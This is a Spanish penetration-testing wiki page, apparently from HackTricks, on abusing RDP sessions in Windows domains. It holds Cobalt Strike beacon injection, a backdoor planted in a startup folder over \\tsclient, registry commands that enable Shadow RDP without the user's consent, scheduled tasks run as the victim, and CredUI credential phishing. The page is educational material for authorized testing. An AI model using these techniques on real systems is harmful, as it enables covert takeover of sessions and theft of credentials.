# Abuso de sesiones RDP

{{#include ../../banners/hacktricks-training.md}}

## Inyección de procesos RDP

Si el **grupo externo** tiene **acceso RDP** a un **equipo** del dominio actual, un atacante que comprometa ese equipo puede esperar a que un miembro del grupo se conecte.

Una vez que el usuario se conecta mediante RDP, el **atacante puede pivotar a la sesión de ese usuario** y abusar de sus permisos en el dominio externo.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Consulta **otras formas de robar sesiones con otras herramientas** [**en esta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

Una **sesión activa de consola o RDP** perteneciente a otro usuario del dominio también es una pista cuando tienes una shell con menos privilegios en el mismo host. La activación entre sesiones de DCOM puede hacer que un servidor COM adecuado en esa sesión interactiva se autentique, y herramientas como RemotePotato0 o KrbRelay pueden capturar o retransmitir esa autenticación. No es necesario que el usuario conectado sea administrador del dominio: un permiso de directorio de alcance limitado, como el permiso para leer una contraseña administrada de gMSA, puede bastar para realizar otro pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Empieza con el ID de sesión y la identidad que aparecen en `query user`, `qwinsta` o en el inventario de sesiones de winPEAS existente. Considéralos **candidatos**, no una prueba de que exista una ruta de relay. La clase COM, sus niveles de suplantación y autenticación, la accesibilidad de la sesión, el enrutamiento del firewall/OXID, las protecciones del protocolo de destino y los permisos efectivos del principal conectado son factores importantes. KrbRelay documenta ejemplos entre sesiones con LDAP, HTTP, SMB y NTLM, pero estas rutas dependen de la versión y la configuración. El channel binding de LDAP es otra barrera contra el relay en el destino. En particular, el proyecto RemotePotato0 señala que su escenario original de explotación de RPC a LDAP se corrigió en 2022; no deduzcas que el relay LDAP tendrá éxito solo porque haya una sesión visible.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Si un usuario accede **por RDP a una máquina** donde un **atacante** lo está **esperando**, el atacante podrá **inyectar un beacon en la sesión RDP del usuario** y, si la **víctima montó su unidad** al conectarse por RDP, el **atacante podría acceder a ella**.

En este caso, bastaría con **comprometer** la **computadora original de la víctima** escribiendo una **backdoor** en la **carpeta de inicio**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Si eres **administrador local** en un host donde la víctima ya tiene una **sesión RDP activa**, es posible que puedas **ver/controlar ese escritorio sin robar la contraseña ni volcar LSASS**.<sup>[[1]](#references)</sup>

Esto depende de la directiva de **shadowing de Remote Desktop Services**, almacenada en:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Valores interesantes:

- `0`: Deshabilitado
- `1`: `EnableInputNotify` (control, requiere aprobación del usuario)
- `2`: `EnableInputNoNotify` (control, **sin aprobación del usuario**)
- `3`: `EnableNoInputNotify` (solo visualización, requiere aprobación del usuario)
- `4`: `EnableNoInputNoNotify` (solo visualización, **sin aprobación del usuario**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Esto resulta especialmente útil cuando un usuario con privilegios conectado por RDP dejó abierta una sesión de escritorio desbloqueada, una sesión de KeePass, una consola MMC, una sesión del navegador o un shell de administrador.

## Tareas programadas como usuario con sesión iniciada

Si eres **administrador local** y el usuario de destino **tiene una sesión iniciada actualmente**, el Programador de tareas puede ejecutar código **como ese usuario sin su contraseña**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Esto convierte la sesión de inicio de sesión existente de la víctima en una primitiva de ejecución:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notas:

- Si el usuario **no ha iniciado sesión**, Windows suele requerir la contraseña para crear una tarea que se ejecute como ese usuario.
- Si el usuario **ha iniciado sesión**, la tarea puede reutilizar el contexto de inicio de sesión existente.
- Esta es una forma práctica de ejecutar acciones de GUI o iniciar binarios dentro de la sesión de la víctima sin tocar LSASS.

## Abuso de CredUI Prompt desde la sesión de la víctima

Una vez que puedas ejecutar código **dentro del escritorio interactivo de la víctima** (por ejemplo, mediante **Shadow RDP** o **una tarea programada que se ejecute como ese usuario**), puedes mostrar un **prompt de credenciales real de Windows** usando las API de CredUI y capturar las credenciales que introduzca la víctima.<sup>[[1]](#references)</sup>

API relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flujo habitual:

1. Inicia un binario en la sesión de la víctima.
2. Muestra un prompt de autenticación de dominio que coincida con la imagen de marca del dominio actual.
3. Desempaqueta el búfer de autenticación devuelto.
4. Valida las credenciales proporcionadas y, opcionalmente, sigue mostrando el prompt hasta que se introduzcan credenciales válidas.

Esto es útil para el **phishing en el host**, porque el prompt se muestra mediante las API estándar de Windows en lugar de un formulario HTML falso.

## Solicitar un PFX en el contexto de la víctima

La misma primitiva de **tarea programada como usuario** puede usarse para solicitar un **certificado/PFX como la víctima que ha iniciado sesión**. Ese certificado puede usarse posteriormente para la **autenticación en AD** como ese usuario, evitando por completo el robo de contraseñas.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Flujo general:

1. Obtén **permisos de administrador local** en un host donde la víctima haya iniciado sesión.
2. Ejecuta la lógica de inscripción/exportación como la víctima mediante una **tarea programada**.
3. Exporta el **PFX** resultante.
4. Usa el PFX para la autenticación en AD mediante PKINIT o basada en certificados.

Consulta las páginas de AD CS para conocer abusos relacionados:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - De redes planas a dominios bloqueados con modelos de niveles](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – opciones de sesión Shadow de `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR del plugin Shadow RDP n.º 465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - módulo schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR para solicitar un PFX mediante una tarea programada n.º 908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - activación DCOM entre sesiones y limitaciones actuales](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - ejemplos de relay entre sesiones y requisitos de CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - comando query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - vinculación de canales LDAP y protección contra relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
